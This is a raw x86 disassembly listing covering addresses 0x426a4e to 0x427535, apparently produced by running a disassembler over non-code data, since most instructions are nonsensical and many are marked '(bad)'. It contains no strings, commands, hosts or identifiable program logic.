  426a4e:	fisubr DWORD PTR [ebx-0x23]
  426a51:	bound  ebx,QWORD PTR [ecx+0x8]
  426a54:	add    eax,0x3eaf00ac
  426a59:	sub    al,0xd7
  426a5b:	in     al,dx
  426a5c:	and    DWORD PTR [esp+ebx*1+0x6b],edi
  426a60:	xchg   edx,eax
  426a61:	sbb    eax,0x9d986054
  426a66:	dec    edi
  426a67:	(bad)  
  426a68:	retf   
  426a69:	retf   0x45d
  426a6c:	cmp    BYTE PTR [ebx],dh
  426a6e:	rep lods al,BYTE PTR ds:[esi]
  426a70:	(bad)  
  426a71:	mov    ax,0x6746
  426a75:	pop    ds
  426a76:	add    eax,0xdc8774ec
  426a7b:	cdq    
  426a7c:	ds push ebp
  426a7e:	add    DWORD PTR [edx],esp
  426a80:	cmc    
  426a81:	xor    DWORD PTR ds:0x3929da80,0xffffff84
  426a88:	xor    eax,0x874c3842
  426a8d:	push   DWORD PTR [ecx]
  426a8f:	pop    ebp
  426a90:	ds in  eax,0x6b
  426a93:	mov    ah,0xf
  426a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a96:	jle    0x426a5e
  426a98:	cmp    al,0xe3
  426a9a:	dec    edi
  426a9b:	cwde   
  426a9c:	(bad)  [ebx+0x5feff24c]
  426aa2:	pop    es
  426aa3:	or     BYTE PTR [eax],cl
  426aa5:	mov    al,0xc5
  426aa7:	stos   DWORD PTR es:[edi],eax
  426aa8:	xor    cl,BYTE PTR [eax-0x14d1f580]
  426aae:	push   eax
  426aaf:	adc    eax,0xb1e2a81b
  426ab4:	jmp    0xf9f30c34
  426ab9:	dec    ebx
  426aba:	out    dx,eax
  426abb:	inc    ebp
  426abc:	mov    ecx,0xa41c09a7
  426ac1:	xchg   esi,eax
  426ac2:	push   eax
  426ac3:	inc    esp
  426ac4:	rcl    DWORD PTR [ebx-0x7d49286e],0xd
  426acb:	into   
  426acc:	cmp    DWORD PTR [ebx+0x29e0e1da],0xc5788561
  426ad6:	pop    ds
  426ad7:	add    BYTE PTR ds:0x81e772aa,al
  426add:	into   
  426ade:	push   ds
  426adf:	iret   
  426ae0:	test   eax,0xc2172d5
  426ae5:	xor    al,0x32
  426ae7:	jle    0x426b12
  426ae9:	sbb    eax,0xbf064b
	...
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0xf7
  426b63:	scas   al,BYTE PTR es:[edi]
  426b64:	push   esi
  426b65:	push   esi
  426b66:	lahf   
  426b67:	sahf   
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	inc    DWORD PTR [eax]
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	cdq    
  426b6f:	inc    esp
  426b70:	or     al,0x95
  426b72:	nop
  426b73:	inc    esp
  426b74:	dec    DWORD PTR [edx-0x656dd198]
  426b7a:	xchg   edx,eax
  426b7b:	dec    ebx
  426b7c:	ror    BYTE PTR [ebp-0x233fc742],cl
  426b82:	xor    DWORD PTR [ecx],eax
  426b84:	sub    eax,0x61764464
  426b89:	cmp    BYTE PTR [ebx-0x749e49a9],ah
  426b8f:	ins    BYTE PTR es:[edi],dx
  426b90:	out    0xc4,al
  426b92:	push   0xa4f86138
  426b97:	in     al,dx
  426b98:	sar    BYTE PTR [eax+0x20eb51c1],cl
  426b9e:	int3   
  426b9f:	xor    cl,ah
  426ba1:	add    edi,ebp
  426ba3:	fs nop
  426ba5:	push   edx
  426ba6:	sahf   
  426ba7:	dec    ebx
  426ba8:	imul   edi
  426baa:	add    BYTE PTR [ecx-0x5ab0ad37],dl
  426bb0:	(bad)  
  426bb1:	or     al,0x67
  426bb3:	or     al,0xa
  426bb5:	repz pop esi
  426bb7:	dec    esi
  426bb8:	jge    0x426c2f
  426bba:	repnz push esi
  426bbc:	mov    dh,0x39
  426bbe:	pop    esp
  426bbf:	fsub   DWORD PTR [ecx+0x1a]
  426bc2:	ror    DWORD PTR [ecx+0x7c],1
  426bc5:	stos   BYTE PTR es:[edi],al
  426bc6:	pop    ds
  426bc7:	mov    bl,0xe6
  426bc9:	pushf  
  426bca:	fistp  DWORD PTR [ebp-0x55e99012]
  426bd0:	jb     0x426c14
  426bd2:	in     al,0xf8
  426bd4:	out    0x77,eax
  426bd6:	dec    edi
  426bd7:	nop
  426bd8:	(bad)
  426bdb:	mov    ecx,ebx
  426bdd:	cmp    ecx,DWORD PTR [esi+0x4c4a679b]
  426be3:	cwde   
  426be4:	inc    esp
  426be5:	stos   BYTE PTR es:[edi],al
  426be6:	xchg   ebx,eax
  426be7:	shl    DWORD PTR [ebp+eax*2-0x3c],1
  426beb:	xor    BYTE PTR [ebx+0x50],0xa7
  426bef:	ficom  WORD PTR [eax]
  426bf1:	mov    cl,0x8
  426bf3:	arpl   WORD PTR [eax-0x854c0d6],dx
  426bf9:	pop    edi
  426bfa:	add    al,0x28
  426bfc:	lock outs dx,BYTE PTR ds:[esi]
  426bfe:	retf   
  426bff:	dec    esi
  426c00:	shl    DWORD PTR [eax-0x5e96d8],1
  426c06:	inc    ebx
  426c07:	push   ecx
  426c08:	xchg   BYTE PTR [edi],bh
  426c0a:	xor    al,0x4b
  426c0c:	mov    ebx,0x4c16c1fc
  426c11:	pop    esi
  426c12:	mov    ds:0xeb82682f,al
  426c17:	retf   0x269a
  426c1a:	jge    0x426c6f
  426c1c:	fnstcw WORD PTR [eax+0x72]
  426c1f:	bound  ebx,QWORD PTR [edx-0x62d437a]
  426c25:	fwait
  426c26:	cmp    ah,bl
  426c28:	sbb    al,al
  426c2a:	adc    eax,0x750ef151
  426c2f:	adc    eax,DWORD PTR [eax]
  426c31:	mov    ds,WORD PTR [ecx+edi*2]
  426c34:	jmp    0xc7cba7aa
  426c39:	mov    ds:0x566fe0c7,eax
  426c3e:	jbe    0x426cb3
  426c40:	daa    
  426c41:	std    
  426c42:	add    BYTE PTR [edx+0xdfe9f13],dl
  426c48:	mov    edi,0x3754acab
  426c4d:	test   BYTE PTR [bp+si],ah
  426c50:	mov    al,0xe4
  426c52:	and    DWORD PTR [eax],ecx
  426c54:	and    BYTE PTR ds:0x594c4246,0x28
  426c5b:	push   edx
  426c5c:	jnp    0x426c96
  426c5e:	sbb    al,0xb8
  426c60:	push   eax
  426c61:	or     eax,0x46b7ef48
  426c66:	cdq    
  426c67:	jmp    0xe9efee78
  426c6c:	cwde   
	...
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0x2773f146
  426ce6:	sahf   
  426ce7:	lahf   
  426ce8:	add    DWORD PTR [eax],eax
  426cea:	inc    DWORD PTR [eax]
  426cec:	add    BYTE PTR [eax],al
  426cee:	adc    al,0xc5
  426cf0:	jmp    0x426d08
  426cf2:	mov    al,ds:0xd35ec5de
  426cf7:	add    dl,BYTE PTR [ebp+0x48]
  426cfa:	jnp    0x426d36
  426cfc:	fcom   DWORD PTR [ebx+0x5d2a7cb9]
  426d02:	sub    BYTE PTR [edx],cl
  426d04:	mov    ds:0x93878353,al
  426d09:	add    eax,DWORD PTR [eax]
  426d0b:	pop    edx
  426d0c:	call   0x8663:0xbe79e15d
  426d13:	cmp    al,0x76
  426d15:	xchg   edi,eax
  426d16:	or     bh,BYTE PTR [ebp+0x3c]
  426d19:	inc    edx
  426d1a:	lahf   
  426d1b:	xor    eax,0x2d013562
  426d20:	ins    BYTE PTR es:[edi],dx
  426d21:	and    BYTE PTR [edx+0x7ba853d5],cl
  426d27:	cmp    bl,cl
  426d29:	pop    edi
  426d2a:	mov    ds:0x7888ff2d,eax
  426d2f:	call   0x797c2a7c
  426d34:	sbb    BYTE PTR [eax+0x3327412e],bl
  426d3a:	jne    0x426d33
  426d3c:	xchg   esp,ebp
  426d3e:	ret    0x4e4c
  426d41:	push   edi
  426d42:	jnp    0x426ce4
  426d44:	jle    0x426d16
  426d46:	nop
  426d47:	ds loope 0x426cfb
  426d4a:	retf   
  426d4b:	sbb    DWORD PTR [edi],esi
  426d4d:	ret    
  426d4e:	clc    
  426d4f:	scas   eax,DWORD PTR es:[edi]
  426d50:	icebp  
  426d51:	(bad)  
  426d52:	mov    al,ds:0xf0b3b0c0
  426d57:	test   al,0x8c
  426d59:	push   0x93d583aa
  426d5e:	rol    BYTE PTR [edx-0x74],1
  426d61:	(bad)  
  426d62:	sbb    eax,0x375b55dc
  426d67:	dec    ebx
  426d68:	js     0x426d0e
  426d6a:	jp     0x426dd4
  426d6c:	(bad)  
  426d6d:	retf   
  426d6e:	xor    dl,al
  426d70:	adc    eax,0x261e5620
  426d75:	mov    ds,WORD PTR [ebx]
  426d77:	dec    edi
  426d78:	push   ecx
  426d79:	leave  
  426d7a:	dec    ecx
  426d7b:	push   ebp
  426d7c:	xchg   dh,cl
  426d7e:	mov    eax,0x24ade48f
  426d83:	stos   BYTE PTR es:[edi],al
  426d84:	bound  edi,QWORD PTR [edx]
  426d86:	jno    0x426dd3
  426d88:	xor    al,0x1a
  426d8a:	in     eax,0xa
  426d8c:	pop    edx
  426d8d:	lock jo 0x426d27
  426d90:	or     bl,0x1
  426d93:	test   BYTE PTR [ebx-0x3a0bc4aa],ah
  426d99:	mov    bl,0x6b
  426d9b:	cmp    esp,DWORD PTR [ebp-0x62]
  426d9e:	adc    bl,dl
  426da0:	fucomip st,st(7)
  426da2:	inc    ebp
  426da3:	xchg   DWORD PTR ds:0x229b46f6,edi
  426da9:	mov    bl,0x11
  426dab:	aam    0x16
  426dad:	adc    ax,0x883d
  426db1:	mov    esi,0x5132593a
  426db6:	imul   esp,DWORD PTR [ecx],0xbe494e0c
  426dbc:	clc    
  426dbd:	or     eax,0x5213a30e
  426dc2:	fwait
  426dc3:	xchg   ecx,eax
  426dc4:	ficomp DWORD PTR [esi-0x12d11707]
  426dca:	push   ss
  426dcb:	pop    esp
  426dcc:	and    DWORD PTR [edx+0x7151ce8d],0xc38c2c84
  426dd6:	xlat   BYTE PTR ds:[ebx]
  426dd7:	inc    ebp
  426dd8:	lds    ecx,FWORD PTR [edx-0xcd62b72]
  426dde:	mov    ah,0x6d
  426de0:	(bad)  [esi-0x60]
  426de3:	mov    ch,0xec
  426de5:	(bad)  
  426de6:	aad    0x18
  426de8:	in     al,dx
  426de9:	mov    ds:0xfbc063,al
	...
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0xbb0c:0xc7c2ecf9
  426e63:	sbb    DWORD PTR [ecx],0x1a09d9c
  426e69:	add    bh,bh
  426e6b:	add    BYTE PTR [eax],al
  426e6d:	add    BYTE PTR [ebx-0x37],dh
  426e70:	dec    esp
  426e71:	mov    al,ds:0xd0306e33
  426e76:	cmp    ax,0xd383
  426e7a:	mov    ds:0x2e49100f,al
  426e7f:	jl     0x426eb7
  426e81:	xlat   BYTE PTR ds:[ebx]
  426e82:	xchg   ebx,eax
  426e83:	std    
  426e84:	cmp    BYTE PTR [ebp+0x6a],dh
  426e87:	jmp    0x426e34
  426e89:	pop    edx
  426e8a:	ror    BYTE PTR [ebp+0x5d],1
  426e8d:	ja     0x426e34
  426e8f:	rcr    BYTE PTR [ebx+0x1e],1
  426e92:	iret   
  426e93:	popa   
  426e94:	(bad)  
  426e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e96:	mov    esp,0xd889cc6c
  426e9b:	jnp    0x426ec2
  426e9d:	retf   
  426e9e:	inc    ebx
  426e9f:	pop    ds
  426ea0:	in     al,dx
  426ea1:	or     eax,0x848112bb
  426ea6:	fwait
  426ea7:	xchg   DWORD PTR [eax-0x4b2e11e0],esp
  426ead:	pushf  
  426eae:	ret    
  426eaf:	or     ebx,DWORD PTR [edx+0x226dde2d]
  426eb5:	mov    cl,0x65
  426eb7:	pop    ds
  426eb8:	adc    BYTE PTR [edi-0x46a2efd8],dl
  426ebe:	jmp    0x7307:0xa5bf36ef
  426ec5:	pop    esi
  426ec6:	inc    eax
  426ec7:	add    al,0x66
  426ec9:	mov    esi,0x51c087b
  426ece:	adc    al,0x7d
  426ed0:	mov    bl,0x9e
  426ed2:	dec    eax
  426ed3:	push   ecx
  426ed4:	xchg   ebp,eax
  426ed5:	mov    cl,0x19
  426ed7:	popa   
  426ed8:	repnz mov cl,0x27
  426edb:	fisubr WORD PTR [ebx-0x33]
  426ede:	jo     0x426e8e
  426ee0:	inc    esp
  426ee1:	popf   
  426ee2:	mov    ah,0xcf
  426ee4:	mov    ch,0xb0
  426ee6:	xchg   esi,ebx
  426ee8:	(bad)  
  426ee9:	test   al,0x16
  426eeb:	cmp    BYTE PTR [ebx+edi*1],dl
  426eee:	rcl    DWORD PTR [edi-0x80],cl
  426ef1:	push   edi
  426ef2:	sbb    esi,DWORD PTR [ebx+0x76]
  426ef5:	gs ror dh,cl
  426ef8:	and    BYTE PTR [esi],0x3c
  426efb:	add    edi,DWORD PTR [edi]
  426efd:	ret    
  426efe:	pop    ebp
  426eff:	mov    dl,0x3d
  426f01:	push   esi
  426f02:	(bad)  
  426f03:	les    edi,FWORD PTR [edi-0x54810b33]
  426f09:	jae    0x426e94
  426f0b:	and    ebp,DWORD PTR [eax+0x15]
  426f0e:	ret    
  426f0f:	addr16 into 
  426f11:	fnstenv [edx-0xb]
  426f14:	rcr    dl,1
  426f16:	pop    ebx
  426f17:	jg     0x426f3b
  426f19:	nop
  426f1a:	pop    es
  426f1b:	bound  esp,QWORD PTR ds:0x33e45052
  426f21:	mov    eax,DWORD PTR [ecx-0x6a]
  426f24:	pop    ebp
  426f25:	dec    esp
  426f26:	adc    al,0x5c
  426f28:	xor    edx,DWORD PTR [ecx+0x90582c0]
  426f2e:	sahf   
  426f2f:	frstor [ecx+0x310373e7]
  426f35:	push   esi
  426f36:	mov    bh,0xc9
  426f38:	push   ds
  426f39:	add    DWORD PTR [edx],0xb24774f1
  426f3f:	push   eax
  426f40:	or     DWORD PTR [edx],edi
  426f42:	pop    eax
  426f43:	pop    esi
  426f44:	int    0x9e
  426f46:	xor    ebx,DWORD PTR [eax]
  426f48:	stos   BYTE PTR es:[edi],al
  426f49:	pop    ss
  426f4a:	pop    edx
  426f4b:	xchg   edi,eax
  426f4c:	dec    eax
  426f4d:	mov    eax,DWORD PTR [esp+eax*4+0x28fa2881]
  426f54:	cdq    
  426f55:	dec    eax
  426f56:	call   0x6b3eb6c4
  426f5b:	repnz sub eax,0x5acd1ca4
  426f61:	cs sub eax,0xbc874075
  426f67:	pop    ebx
  426f68:	jecxz  0x426f33
  426f6a:	pusha  
  426f6b:	ds add BYTE PTR cs:[eax],al
	...
  426fd3:	add    BYTE PTR [eax],al
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [esp+edi*1-0x63f4c3c8],esp
  426fe7:	mov    eax,ds:0xff0001
  426fec:	add    BYTE PTR [eax],al
  426fee:	sub    DWORD PTR ds:0x2f59e3f,esi
  426ff4:	(bad)  
  426ff5:	es jge 0x42701f
  426ff8:	push   esi
  426ff9:	jne    0x426fac
  426ffb:	mov    esp,0x4161794a
  427000:	addr16 cld 
  427002:	xor    al,0x8a
  427004:	icebp  
  427005:	(bad)  
  427006:	fidivr DWORD PTR [esi]
  427008:	jne    0x426fef
  42700a:	mov    ecx,0x615405d1
  42700f:	jmp    0xd64dc17f
  427014:	push   edi
  427015:	pop    esi
  427016:	sbb    al,0xe6
  427018:	fdiv   DWORD PTR [edx]
  42701a:	je     0x427038
  42701c:	retf   0x4263
  42701f:	add    al,0xa9
  427021:	add    DWORD PTR [ecx-0x758c4e76],esp
  427027:	fwait
  427028:	repz cmp bh,al
  42702b:	push   ebx
  42702c:	shl    BYTE PTR [ecx],0x63
  42702f:	mov    ebx,0x2031a009
  427034:	shl    DWORD PTR [ebp+0x38],1
  427037:	bound  edx,QWORD PTR [ebp+0x5754332c]
  42703d:	je     0x427070
  42703f:	test   DWORD PTR [ecx+0x10],esp
  427042:	jne    0x42706e
  427044:	inc    edi
  427045:	dec    edx
  427046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427047:	out    dx,eax
  427048:	sbb    al,0x81
  42704a:	enter  0x3a4c,0xa8
  42704e:	mov    dl,0x12
  427050:	xchg   BYTE PTR [ebp-0x73],dh
  427053:	mov    dh,0x44
  427055:	mov    ebp,0xe63c3ad6
  42705a:	pusha  
  42705b:	mov    dh,0x51
  42705d:	xchg   BYTE PTR [edx-0x4d8e57c6],dl
  427063:	adc    eax,0x42574e5c
  427068:	push   ebp
  427069:	xor    al,0xb
  42706b:	popa   
  42706c:	add    eax,0x28bceb9a
  427071:	lock sub al,0xd7
  427074:	lds    esi,FWORD PTR [edx]
  427076:	push   eax
  427077:	data16 int3 
  427079:	hlt    
  42707a:	into   
  42707b:	dec    edi
  42707c:	shl    al,0xc4
  42707f:	push   esp
  427080:	jl     0x42708b
  427082:	mov    eax,ds:0x9b69d0d1
  427087:	inc    esi
  427088:	ret    0xc5bf
  42708b:	sar    ah,1
  42708d:	lock dec ebx
  42708f:	pop    edi
  427090:	dec    ebp
  427091:	adc    al,al
  427093:	ret    0x2e59
  427096:	cdq    
  427097:	sbb    DWORD PTR [esi-0x5120a15c],edi
  42709d:	sub    ch,BYTE PTR [ebx]
  42709f:	xlat   BYTE PTR ds:[ebx]
  4270a0:	xchg   ebp,eax
  4270a1:	retf   0xaa92
  4270a4:	and    BYTE PTR [esi],cl
  4270a6:	or     BYTE PTR [esi+0x6f470d52],al
  4270ac:	sbb    edi,DWORD PTR [esi-0x105bd2e2]
  4270b2:	leave  
  4270b3:	xor    DWORD PTR ds:0xb33f9ea4,esi
  4270b9:	adc    ch,BYTE PTR [edx]
  4270bb:	popf   
  4270bc:	pop    ebp
  4270bd:	ins    BYTE PTR es:[edi],dx
  4270be:	ret    
  4270bf:	bound  ebp,QWORD PTR [edi+esi*1-0xb6aa26d]
  4270c6:	mov    fs,WORD PTR [ebp+0x36]
  4270c9:	and    ch,BYTE PTR [edi+0x5003d378]
  4270cf:	cmp    eax,DWORD PTR [ebx]
  4270d1:	push   eax
  4270d2:	or     eax,0xc7dd9217
  4270d7:	push   esp
  4270d8:	std    
  4270d9:	pop    ds
  4270da:	or     DWORD PTR [ecx-0x500b8d58],ebp
  4270e0:	bound  ecx,QWORD PTR [edi+0x37250b44]
  4270e6:	mov    dl,0x80
  4270e8:	sub    eax,0x2f40f6d8
	...
  427155:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42715c:	(bad)  
  42715d:	std    
  42715e:	inc    esp
  42715f:	mov    ebp,0x7ff29d96
  427164:	(bad)  
  427165:	pop    ebp
  427166:	fwait
  427167:	mov    ds:0xff0001,al
  42716c:	add    BYTE PTR [eax],al
  42716e:	mov    DWORD PTR [ebp-0x53],0x5484328e
  427175:	(bad)  [eax-0x66]
  427178:	lods   eax,DWORD PTR ds:[esi]
  42717a:	retf   
  42717b:	data16 jecxz 0x427192
  42717e:	inc    esp
  42717f:	cmp    BYTE PTR [ecx+0x635da1b0],bh
  427185:	push   0xfffffff7
  427187:	adc    ebx,DWORD PTR cs:[edx+0x79ac45b0]
  42718e:	dec    edi
  42718f:	dec    ebp
  427190:	lea    esi,[ebp-0x6a96d456]
  427196:	js     0x427168
  427198:	mov    ebx,0xfcd5699f
  42719d:	mov    cl,0x21
  42719f:	xchg   esi,eax
  4271a0:	xchg   ebx,eax
  4271a1:	dec    ecx
  4271a2:	pop    es
  4271a3:	ja     0x42715c
  4271a5:	pusha  
  4271a6:	sbb    BYTE PTR [edx],dl
  4271a8:	ss ss or eax,0x88aba345
  4271af:	jmp    0x4bf7472
  4271b4:	ret    0xeba4
  4271b7:	pop    edx
  4271b8:	fsub   st(1),st
  4271ba:	imul   eax,ebx,0x974cfa51
  4271c0:	push   edx
  4271c1:	xor    BYTE PTR [ebp+0x15],0x2f
  4271c5:	cmp    ah,ch
  4271c7:	cmp    al,0xa5
  4271c9:	push   esp
  4271ca:	fdivr  QWORD PTR [ebx]
  4271cc:	sti    
  4271cd:	mov    BYTE PTR [eax-0x32646cae],dh
  4271d3:	jae    0x4271b1
  4271d5:	mov    bl,0xb4
  4271d7:	js     0x4271e9
  4271d9:	and    eax,DWORD PTR [esi+0x2b35330c]
  4271df:	sahf   
  4271e0:	fistp  WORD PTR ds:0x637c339
  4271e6:	stos   BYTE PTR es:[edi],al
  4271e7:	mov    bl,0x32
  4271e9:	xor    DWORD PTR [ecx+edx*4],ebp
  4271ec:	pushf  
  4271ed:	(bad)  
  4271ee:	out    0xf6,eax
  4271f0:	push   edx
  4271f1:	arpl   WORD PTR [ebx-0x3e051308],bp
  4271f7:	or     DWORD PTR [ecx-0x2c0e31c3],ebx
  4271fd:	xlat   BYTE PTR ds:[ebx]
  4271fe:	mov    bh,0xbb
  427200:	fdivr  QWORD PTR [esi+esi*8-0x16]
  427204:	pop    esp
  427205:	and    eax,0x421292dd
  42720a:	mov    al,ds:0x56e83828
  42720f:	mov    al,ds:0x2b681518
  427214:	inc    esp
  427215:	mov    edx,0xaf09f815
  42721a:	jne    0x42726e
  42721c:	stos   DWORD PTR es:[edi],eax
  42721d:	add    esi,DWORD PTR [esi+0x624ab5e4]
  427223:	xchg   edx,eax
  427224:	addr16 sbb eax,0x564cd1a4
  42722a:	imul   ebx,DWORD PTR ds:0x6806681e,0xffffffd3
  427231:	mov    ds,WORD PTR [edi-0x77d029fe]
  427237:	clc    
  427238:	xchg   edi,eax
  427239:	sbb    ebp,DWORD PTR [ebp+0xa2b09af]
  42723f:	(bad)  
  427241:	cmp    al,0x13
  427243:	(bad)  
  427244:	cld    
  427245:	data16 xor al,0x6b
  427248:	bound  edx,QWORD PTR [ebp-0x74]
  42724b:	push   ds
  42724c:	jecxz  0x427288
  42724e:	xchg   edi,eax
  42724f:	inc    edi
  427250:	xor    BYTE PTR [edi+edx*2],0x13
  427254:	sti    
  427255:	loop   0x427228
  427257:	lods   al,BYTE PTR ds:[esi]
  427258:	mov    cl,0x38
  42725a:	xor    eax,DWORD PTR [ebp+0x266f2f6f]
  427260:	arpl   WORD PTR [ebx+0x79],bp
  427263:	sub    dl,BYTE PTR [ecx+0x75d72220]
  427269:	inc    esi
  42726a:	adc    cl,ah
  42726c:	out    dx,eax
	...
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xd7bd8625,al
  4272e6:	call   0x0:0xff0001a3
  4272ed:	add    BYTE PTR [ebp+ecx*2-0x61],al
  4272f1:	push   ss
  4272f2:	loope  0x4272fd
  4272f4:	int    0x69
  4272f6:	jns    0x42728c
  4272f8:	add    BYTE PTR [ecx-0x5e],0x8a
  4272fc:	je     0x42734a
  4272fe:	pushw  ss
  427300:	or     al,0x4d
  427303:	fbstp  TBYTE PTR [edi-0x6f]
  427306:	loope  0x427344
  427308:	retf   0x353b
  42730b:	test   BYTE PTR [edx-0x67],dl
  42730e:	jg     0x42731e
  427310:	(bad)  
  427311:	push   ss
  427312:	fs inc eax
  427314:	add    DWORD PTR [esi+0x3a],0x1a
  427318:	add    DWORD PTR [eax-0x26],ecx
  42731b:	loop   0x427345
  42731d:	dec    ebp
  42731e:	popf   
  42731f:	sar    BYTE PTR [ecx+0x59],cl
  427322:	xor    eax,0xce60d22c
  427327:	adc    al,BYTE PTR [esi-0xabdee3d]
  42732d:	adc    eax,ebx
  42732f:	dec    ebx
  427330:	jl     0x4272e3
  427332:	push   ecx
  427333:	lahf   
  427334:	repnz inc ebx
  427336:	jno    0x42736f
  427338:	fadd   DWORD PTR ds:0x377bd127
  42733e:	mov    al,ds:0xd94ed3b9
  427343:	jmp    0x427331
  427345:	sub    ebp,ebp
  427347:	outs   dx,BYTE PTR ds:[esi]
  427348:	push   esp
  427349:	pop    es
  42734a:	pop    ss
  42734b:	popf   
  42734c:	mov    DWORD PTR [edi-0x28],ecx
  42734f:	lock sbb al,0xa7
  427352:	jbe    0x42738e
  427354:	and    al,0x63
  427356:	div    BYTE PTR [ebp-0xb811946]
  42735c:	iret   
  42735d:	xor    ah,BYTE PTR [edx]
  42735f:	mov    ds,WORD PTR [esi-0x5f]
  427362:	test   al,0xf
  427364:	mov    dl,0x48
  427366:	nop
  427367:	sbb    ebx,DWORD PTR [ebp-0x38]
  42736a:	test   BYTE PTR [edx+0x721c844f],dl
  427370:	inc    esi
  427371:	dec    esi
  427372:	jo     0x42734a
  427374:	cs pop ebp
  427376:	add    edi,DWORD PTR [edx+0x27]
  427379:	fs push ds
  42737b:	or     al,0x91
  42737d:	test   al,0x1e
  42737f:	jno    0x427369
  427381:	sbb    al,0xa4
  427383:	in     eax,0x8d
  427385:	cli    
  427386:	xor    BYTE PTR [esi],ah
  427388:	push   ebx
  427389:	add    al,0x6f
  42738b:	dec    esp
  42738c:	pop    ecx
  42738d:	and    al,0x0
  42738f:	dec    ebx
  427390:	cmp    ebp,0xe8478a0e
  427396:	add    ch,BYTE PTR [ebx-0x8]
  427399:	retf   0xa6fe
  42739c:	sti    
  42739d:	ret    0xa6c1
  4273a0:	fst    DWORD PTR [ecx]
  4273a2:	dec    esp
  4273a3:	in     al,0xe6
  4273a5:	and    ah,ah
  4273a7:	lea    edi,[ebx]
  4273a9:	loop   0x4273dd
  4273ab:	add    DWORD PTR [ebp+eiz*8-0x74e6b7ee],edx
  4273b2:	dec    ecx
  4273b3:	repz push ss
  4273b5:	jp     0x427401
  4273b7:	push   es
  4273b8:	sbb    ebp,DWORD PTR [edi]
  4273ba:	sub    ecx,DWORD PTR [ecx-0x40]
  4273bd:	dec    edi
  4273be:	jmp    0x6b47:0x3b5071ee
  4273c5:	aaa    
  4273c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273c7:	daa    
  4273c8:	ja     0x42736c
  4273ca:	mov    bl,0x28
  4273cc:	pushf  
  4273cd:	jle    0x4273b4
  4273cf:	std    
  4273d0:	cs loopne 0x4273e7
  4273d3:	and    DWORD PTR [ecx-0x6c],edi
  4273d6:	push   esp
  4273d7:	mov    ds:0x654253f2,eax
  4273dc:	(bad)  
  4273dd:	xchg   edx,eax
  4273de:	sub    esp,esi
  4273e0:	gs mov edi,0x2747e940
  4273e6:	add    al,0xdc
  4273e8:	inc    ebx
  4273e9:	inc    edx
  4273ea:	dec    esi
  4273eb:	in     eax,0x97
	...
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esp,DWORD PTR [ecx+edi*8-0x5b660371]
  427468:	add    DWORD PTR [eax],eax
  42746a:	inc    DWORD PTR [eax]
  42746c:	add    BYTE PTR [eax],al
  42746e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  427470:	bsr    edx,edx
  427473:	add    eax,0xe0b0113c
  427478:	push   cs
  427479:	(bad)
  42747d:	jge    0x4274d9
  42747f:	call   DWORD PTR [ebx+0x13]
  427482:	call   0xb99eeade
  427487:	mov    eax,0x685891f1
  42748c:	and    BYTE PTR [esi-0x6f],bl
  42748f:	sub    BYTE PTR [ebp-0x23a53c9],0xc5
  427496:	pop    eax
  427497:	push   edx
  427498:	mov    es,WORD PTR [esp+ecx*2]
  42749b:	(bad)  
  42749c:	stos   DWORD PTR es:[edi],eax
  42749d:	loop   0x427463
  42749f:	mov    ds:0x9904eb1,eax
  4274a4:	add    eax,0x3b9be71c
  4274a9:	scas   eax,DWORD PTR es:[edi]
  4274aa:	pusha  
  4274ab:	xchg   edi,eax
  4274ac:	jae    0x4274b0
  4274ae:	jae    0x427510
  4274b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274b1:	ds int3 
  4274b3:	call   0x900c:0x5e1bfef9
  4274ba:	jmp    0x8364fdc1
  4274bf:	fcomip st,st(4)
  4274c1:	les    eax,FWORD PTR [ebp+0x20ee7c89]
  4274c7:	jg     0x4274ff
  4274c9:	xor    ch,BYTE PTR [esi]
  4274cb:	dec    eax
  4274cc:	sub    bl,BYTE PTR [ebp+0x3a]
  4274cf:	stos   DWORD PTR es:[edi],eax
  4274d0:	xor    al,0xe9
  4274d2:	sbb    DWORD PTR [ecx],esi
  4274d4:	(bad)  
  4274d5:	jns    0x427470
  4274d7:	rol    DWORD PTR [ebp+0x69],cl
  4274da:	xchg   esi,eax
  4274db:	mov    al,ds:0x7b7d325a
  4274e0:	les    edx,FWORD PTR [ecx+0x3fcb4cd3]
  4274e6:	dec    ebp
  4274e7:	and    ch,BYTE PTR [edi-0xd6ae9ef]
  4274ed:	sub    eax,0x882a09f
  4274f2:	ror    esp,0xc0
  4274f5:	rcr    BYTE PTR [ebx+ebp*1-0x6fc9f5b0],1
  4274fc:	xchg   ecx,eax
  4274fd:	repz mov cs,WORD PTR [ebx]
  427500:	inc    edi
  427501:	ret    0x1cab
  427504:	mov    al,ds:0xb85894ad
  427509:	pop    edx
  42750a:	xor    dl,BYTE PTR [esp+esi*1-0x8b315be]
  427511:	in     al,0xbd
  427513:	adc    DWORD PTR [eax-0x564a2447],0x46aae992
  42751d:	jno    0x427515
  42751f:	fimul  DWORD PTR [edi-0x193c663d]
  427525:	inc    edi
  427526:	and    al,0x46
  427528:	(bad)  
  427529:	rcl    al,cl
  42752b:	fimul  WORD PTR [ecx]
  42752d:	xor    eax,0x1dffd137
  427532:	dec    esi
  427533:	or     dh,BYTE PTR [esi]
  427535:	pop    ebp
